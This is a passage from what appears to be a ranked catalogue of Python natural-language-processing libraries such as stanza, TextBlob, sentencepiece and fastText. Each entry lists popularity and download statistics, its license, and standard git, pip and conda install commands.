&lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/stanfordnlp/stanza&#34;&gt;stanza&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 6.1K) - Official Stanford NLP Python Library for Many Human Languages. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/stanfordnlp/stanza&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 790 · 📦 1.1K · 📋 710 - 12% open · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/stanfordnlp/stanza&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/stanza&#34;&gt;PyPi&lt;/a&gt; (📥 440K / month · 📦 67 · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install stanza&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/stanfordnlp/stanza&#34;&gt;Conda&lt;/a&gt; (📥 5.1K · ⏱️ 23.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c stanfordnlp stanza&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JohnSnowLabs/spark-nlp&#34;&gt;spark-nlp&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 2.7K) - State of the Art Natural Language Processing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/JohnSnowLabs/spark-nlp&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 560 · 📋 680 - 8% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/JohnSnowLabs/spark-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/spark-nlp&#34;&gt;PyPi&lt;/a&gt; (📥 1.6M / month · 📦 11 · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install spark-nlp&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sloria/TextBlob&#34;&gt;TextBlob&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 8.2K · 💤) - Simple, Pythonic, text processing--Sentiment analysis, part-of-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/sloria/TextBlob&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 35 · 🔀 1.1K · 📥 99 · 📦 20K · 📋 260 - 39% open · ⏱️ 22.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/sloria/TextBlob&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/textblob&#34;&gt;PyPi&lt;/a&gt; (📥 940K / month · 📦 1.4K · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install textblob&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/textblob&#34;&gt;Conda&lt;/a&gt; (📥 160K · ⏱️ 24.02.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge textblob&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/sentencepiece&#34;&gt;sentencepiece&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 5.9K) - Unsupervised text tokenizer for Neural Network-based text.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/sentencepiece&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 66 · 🔀 810 · 📥 21K · 📦 15K · 📋 520 - 7% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/sentencepiece&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sentencepiece&#34;&gt;PyPi&lt;/a&gt; (📥 6.9M / month · 📦 390 · ⏱️ 18.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sentencepiece&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sentencepiece&#34;&gt;Conda&lt;/a&gt; (📥 190K · ⏱️ 08.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sentencepiece&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/huggingface/tokenizers&#34;&gt;Tokenizers&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 5.6K) - Fast State-of-the-Art Tokenizers optimized for Research and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/huggingface/tokenizers&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 56 · 🔀 470 · 📦 49 · 📋 630 - 30% open · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/huggingface/tokenizers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tokenizers&#34;&gt;PyPi&lt;/a&gt; (📥 7.2M / month · 📦 120 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tokenizers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tokenizers&#34;&gt;Conda&lt;/a&gt; (📥 170K · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tokenizers&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/fastText&#34;&gt;fastText&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 24K) - Library for fast text representation and classification. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/fastText&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 59 · 🔀 4.4K · 📦 2.9K · 📋 1.1K - 43% open · ⏱️ 04.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/fastText&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fasttext&#34;&gt;PyPi&lt;/a&gt; (📥 510K / month · 📦 180 · ⏱️ 28.04.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fasttext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/fasttext&#34;&gt;Conda&lt;/a&gt; (📥 30K · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge fasttext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dedupeio/dedupe&#34;&gt;Dedupe&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 3.4K) - A python library for accurate and scalable fuzzy matching, record.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dedupeio/dedupe&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 64 · 🔀 480 · 📦 220 · 📋 730 - 6% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dedupeio/dedupe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dedupe&#34;&gt;PyPi&lt;/a&gt; (📥 310K / month · 📦 48 · ⏱️ 21.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dedupe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dedupe&#34;&gt;Conda&lt;/a&gt; (📥 3.9K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dedupe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/text&#34;&gt;torchtext&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 3K) - Data loaders and abstractions for text and NLP. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/text&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 720 · 📋 720 - 45% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/text&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchtext&#34;&gt;PyPi&lt;/a&gt; (📥 150K / month · 📦 440 · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchtext&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/text&#34;&gt;TensorFlow Text&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 940) - Making text a first-class citizen in TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/text&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 87 · 🔀 220 · 📦 1.8K · 📋 220 - 40% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/text&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-text&#34;&gt;PyPi&lt;/a&gt; (📥 4.1M / month · 📦 78 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-text&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/OpenNMT/OpenNMT-py&#34;&gt;OpenNMT&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 5.6K) - Open Source Neural Machine Translation in PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/OpenNMT/OpenNMT-py&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 2.1K · 📦 140 · 📋 1.3K - 8% open · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/OpenNMT/OpenNMT-py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/OpenNMT-py&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 9 · ⏱️ 14.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install OpenNMT-py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmipt/DeepPavlov&#34;&gt;DeepPavlov&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 5.7K) - An open source library for deep learning end-to-end dialog.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmipt/DeepPavlov&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 67 · 🔀 1K · 📦 270 · 📋 630 - 12% open · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmipt/DeepPavlov&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deeppavlov&#34;&gt;PyPi&lt;/a&gt; (📥 12K / month · 📦 6 · ⏱️ 27.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deeppavlov&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepset-ai/haystack&#34;&gt;haystack&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.7K) - Haystack is an open source NLP framework that leverages Transformer.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepset-ai/haystack&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 760 · 📥 13 · 📋 1.4K - 15% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepset-ai/haystack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/haystack&#34;&gt;PyPi&lt;/a&gt; (📥 1.1K / month · 📦 85 · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install haystack&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jamesturk/jellyfish&#34;&gt;jellyfish&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.7K) - a python library for doing approximate and phonetic matching of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jamesturk/jellyfish&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 150 · 📦 3.7K · 📋 110 - 9% open · ⏱️ 07.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jamesturk/jellyfish&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/jellyfish&#34;&gt;PyPi&lt;/a&gt; (📥 2.1M / month · 📦 400 · ⏱️ 07.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install jellyfish&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/jellyfish&#34;&gt;Conda&lt;/a&gt; (📥 220K · ⏱️ 08.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge jellyfish&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snowballstem/snowball&#34;&gt;snowballstemmer&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 560) - Snowball compiler and stemming algorithms. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snowballstem/snowball&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 160 · 📦 4 · 📋 77 - 42% open · ⏱️ 17.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snowballstem/snowball&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/snowballstemmer&#34;&gt;PyPi&lt;/a&gt; (📥 6.8M / month · 📦 6.7K · ⏱️ 16.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install snowballstemmer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/snowballstemmer&#34;&gt;Conda&lt;/a&gt; (📥 4.3M · ⏱️ 17.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge snowballstemmer&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/makcedward/nlpaug&#34;&gt;nlpaug&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 3.3K) - Data augmentation for NLP. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/makcedward/nlpaug&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 360 · 📦 330 · 📋 180 - 20% open · ⏱️ 03.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/makcedward/nlpaug&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nlpaug&#34;&gt;PyPi&lt;/a&gt; (📥 80K / month · 📦 14 · ⏱️ 23.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nlpaug&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/nlpaug&#34;&gt;Conda&lt;/a&gt; (📥 1.8K · ⏱️ 25.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge nlpaug&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rspeer/python-ftfy&#34;&gt;ftfy&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 3.2K) - Fixes mojibake and other glitches in Unicode text, after the fact. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rspeer/python-ftfy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 110 · 📦 5.7K · 📋 130 - 9% open · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rspeer/python-ftfy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ftfy&#34;&gt;PyPi&lt;/a&gt; (📥 1.8M / month · 📦 490 · ⏱️ 09.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ftfy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ftfy&#34;&gt;Conda&lt;/a&gt; (📥 160K · ⏱️ 13.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ftfy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/allenai/scispacy&#34;&gt;SciSpacy&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 1.2K) - A full spaCy pipeline and models for scientific/biomedical documents. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/allenai/scispacy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 23 · 🔀 150 · 📦 460 · 📋 260 - 14% open · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/allenai/scispacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scispacy&#34;&gt;PyPi&lt;/a&gt; (📥 25K / month · 📦 17 · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scispacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NVIDIA/NeMo&#34;&gt;NeMo&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 4.3K) - NeMo: a toolkit for conversational AI. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/NVIDIA/NeMo&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 960 · 📥 5.3K · 📋 1.1K - 6% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/NVIDIA/NeMo&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/nemo-toolkit&#34;&gt;PyPi&lt;/a&gt; (📥 18K / month · 📦 7 · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install nemo-toolkit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/miso-belica/sumy&#34;&gt;Sumy&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.8K) - Module for automatic summarization of text documents and HTML pages. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/miso-belica/sumy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 22 · 🔀 470 · 📦 1.2K · 📋 100 - 13% open · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/miso-belica/sumy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sumy&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 100 · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sumy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sumy&#34;&gt;Conda&lt;/a&gt; (📥 950 · ⏱️ 22.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sumy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/pytext&#34;&gt;PyText&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 6.3K) - A natural language modeling framework based on PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; 